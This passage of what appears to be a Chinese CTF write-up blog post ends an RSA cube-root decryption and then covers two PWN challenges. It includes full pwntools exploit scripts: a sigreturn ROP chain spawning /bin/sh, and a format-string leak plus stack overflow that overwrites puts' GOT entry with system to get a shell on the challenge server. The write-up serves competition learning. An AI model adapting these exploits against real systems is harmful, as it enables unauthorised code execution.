class="number">2260375559104345425590426977960386256287009777233277062625487017885931446911942921201492850167115455071935831283269948569220356763988762825230315520633702443866690239945242948370781975714325308306543337600783340792458991506685843729962897796956171467876531084194426101796617903015810156717396227079274786269217370618477266867389155551378798713259843750289765858717627925689021561352438080039804957145513478767641674644346609224034274906228784593435462413278410143</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">21</span>):</span><br><span class="line">   candidate = ciphertext + offset * modulus</span><br><span class="line">   root, exact = gmpy2.iroot(candidate, <span class="number">3</span>) </span><br><span class="line">   <span class="keyword">if</span> exact: </span><br><span class="line">     <span class="built_in">print</span>(long_to_bytes(root))  </span><br></pre></td></tr></table></figure>

<p>解题收获：</p>
<p>对密码学的rsa解密公式更加理解</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921450-1252213645.jpg" alt="img"></p>
<p>这里输出完之后会直接接收一串字符串</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921458-1226483841.jpg" alt="img"></p>
<p>然后跳转进来，可以看到能接收的字符串是远远多于它所分配的空间，可以利用栈溢出的漏洞</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921595-1495059577.jpg" alt="img"></p>
<p>然后可以直接看到这里有&#x2F;bin&#x2F;sh的地址</p>
<p>然后就是简单构造一个rop，然后利用栈溢出跳转到构造的rop上执行</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">data</span>):</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_after</span>(<span class="params">prompt, data</span>):</span><br><span class="line">   p.sendafter(prompt, data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_line</span>(<span class="params">data</span>):</span><br><span class="line">   p.sendline(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">send_line_after</span>(<span class="params">prompt, data</span>):</span><br><span class="line">   p.sendlineafter(prompt, data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">receive_data</span>():</span><br><span class="line">   <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">print_receive</span>():</span><br><span class="line">   <span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">receive_until</span>(<span class="params">delimiter</span>):</span><br><span class="line">   <span class="keyword">return</span> p.recvuntil(delimiter)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">interactive_mode</span>():</span><br><span class="line">   p.interactive()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">debug_mode</span>():</span><br><span class="line">   gdb.attach(p)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_leak_address</span>():</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> p = remote(<span class="string">&#x27;101.200.58.4&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> sig_frame = SigreturnFrame()</span><br><span class="line"> sig_frame.rax = <span class="number">59</span> </span><br><span class="line"> sig_frame.rdi = <span class="number">0x40200A</span> </span><br><span class="line"> sig_frame.rsi = <span class="number">0x0</span> </span><br><span class="line"> sig_frame.rdx = <span class="number">0x0</span> </span><br><span class="line"> sig_frame.rip = <span class="number">0x40102D</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> payload = (</span><br><span class="line">   p64(<span class="number">0x40103D</span>) + p64(<span class="number">0x401034</span>) + p64(<span class="number">0x401030</span>) + </span><br><span class="line">   p64(<span class="number">0x401034</span>) + p64(<span class="number">0x401030</span>) + p64(<span class="number">0x401034</span>) + </span><br><span class="line">   p64(<span class="number">0x401030</span>) + p64(<span class="number">0x401034</span>) + p64(<span class="number">0x40102D</span>) + </span><br><span class="line">   flat(sig_frame)</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> p.interactive() </span><br></pre></td></tr></table></figure>

<p>解题收获：</p>
<p>对简单栈溢出漏洞更熟练解出赛题</p>
<h3 id="Ret"><a href="#Ret" class="headerlink" title="Ret"></a>Ret</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921462-2002942619.jpg" alt="img"></p>
<p>checksec查看保护发现是amd64位系统，几乎什么保护都没有开，将程序拖入ida</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921454-1116763471.jpg" alt="img"></p>
<p>发现在output函数中存在一个格式化字符串漏洞</p>
<p><img src="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image092.jpg" alt="img"></p>
<p>在input函数中当随机数大于等于0x90时会刚好可以覆盖rbp和ret地址，并且read读取的长度取决于 seed，而seed是存储在栈上的，那么只要控制rbp的值并且把程序劫持到input函数中的read函数即可 实现一个非常长的栈溢出，而想要控制rbp的值则需要泄露栈的地址，前面的格式化字符串漏洞就刚好 可以泄露栈地址，后面就是利用栈溢出，使用puts函数泄露出libc基地址，然后将puts函数的got表改为system函数，但 是在使用puts函数泄露libc地址之后rdx会置0，后面使用read修改got表使需要让rdx不为0，所以在中 间执行一个srand函数使rdx有值，修改puts函数的got表并写入&#x2F;bin&#x2F;sh字符串即可执行 system(“&#x2F;bin&#x2F;sh”)拿到shell</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r = remote(<span class="string">&quot;101.200.58.4&quot;</span>, <span class="string">&quot;10004&quot;</span>)</span><br><span class="line"></span><br><span class="line"> libc_shared_lib = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.sendafter(<span class="string">&quot;ask?\n&quot;</span>, <span class="string">&quot;%p\x00&quot;</span>)</span><br><span class="line"> leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;ok,&quot;</span>)[:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Leaked address: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"> stack_addr = leak_addr + <span class="number">0x7ffffa9424b8</span> - <span class="number">0x7ffffa9424ac</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> c_lib = ctypes.cdll.LoadLibrary(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"> c_lib.srand(c_lib.time(<span class="number">0</span>))</span><br><span class="line"> generated_seed = c_lib.rand() % <span class="number">160</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Generated seed: &quot;</span> + <span class="built_in">hex</span>(generated_seed))</span><br><span class="line"> <span class="keyword">if</span> generated_seed &lt; <span class="number">0x90</span>:</span><br><span class="line">   quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> padding = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> </span><br><span class="line"> first_payload = padding + p64(stack_addr) + p64(<span class="number">0x400873</span>)</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(r.recvuntil(<span class="string">&quot;number\n&quot;</span>))</span><br><span class="line"> r.send(first_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> puts_got_addr = <span class="number">0x601018</span></span><br><span class="line"> puts_plt_addr = <span class="number">0x400600</span></span><br><span class="line"> pop_rdi_ret_addr = <span class="number">0x400923</span></span><br><span class="line"> ret_gadget_addr = pop_rdi_ret_addr + <span class="number">1</span></span><br><span class="line"> pop_rsi_ret_addr = <span class="number">0x400921</span></span><br><span class="line"> read_plt_addr = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> second_payload = padding</span><br><span class="line"> second_payload += p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line"> second_payload += p64(<span class="number">0x400630</span>) </span><br><span class="line"> second_payload += p64(pop_rdi_ret_addr) + p64(<span class="number">0</span>) + p64(pop_rsi_ret_addr) + p64(puts_got_addr) + p64(<span class="number">0</span>) + p64(read_plt_addr)</span><br><span class="line"> second_payload += p64(ret_gadget_addr) + p64(pop_rdi_ret_addr) + p64(puts_got_addr + <span class="number">8</span>) + p64(puts_plt_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> sleep(<span class="number">1</span>)</span><br><span class="line"> r.send(second_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc_shared_lib.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;libc base address: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.send(p64(libc_base + libc_shared_lib.symbols[<span class="string">&quot;system&quot;</span>]) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> r.interactive()</span><br></pre></td></tr></table></figure>

<p>解题收获：</p>
<p>对格式化字符串和栈溢出的利用漏洞更熟悉利用</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/posts/27465.html" rel="next" title="SSRF打进内网">
                <i class="fa fa-chevron-left"></i> SSRF打进内网
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="mailto:2186533588@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241005203439344-2138322922.png" target="_blank" title="VX">
                      
                        <i class="fa fa-fw fa-VX"></i>VX</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%9A%84%E9%80%9A%E7%9F%A5"><span class="nav-number">1.1.</span> <span class="nav-text">信息安全大赛的通知</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.2.</span> <span class="nav-text">编码转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#coding-analyse"><span class="nav-number">1.3.</span> <span class="nav-text">coding_analyse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bluetooth"><span class="nav-number">1.4.</span> <span class="nav-text">bluetooth</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#input-data"><span class="nav-number">2.1.</span> <span class="nav-text">input_data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Admin"><span class="nav-number">2.2.</span> <span class="nav-text">Admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask"><span class="nav-number">2.3.</span> <span class="nav-text">Flask</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REVERSE"><span class="nav-number">3.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-apk"><span class="nav-number">3.1.</span> <span class="nav-text">ez_apk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">文件分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E7%8C%AB"><span class="nav-number">3.3.</span> <span class="nav-text">机器猫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSMazeee"><span class="nav-number">3.4.</span> <span class="nav-text">CSMazeee</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%B0%8F%E5%BF%83"><span class="nav-number">4.1.</span> <span class="nav-text">不小心</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Base"><span class="nav-number">4.2.</span> <span class="nav-text">Base</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-crypto1"><span class="nav-number">4.3.</span> <span class="nav-text">easy_crypto1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#just-math"><span class="nav-number">4.4.</span> <span class="nav-text">just math</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ASM"><span class="nav-number">5.1.</span> <span class="nav-text">ASM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ret"><span class="nav-number">5.2.</span> <span class="nav-text">Ret</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">关根</span>

  
</div>
<!--

  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>

-->


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>本站总访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>本站总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
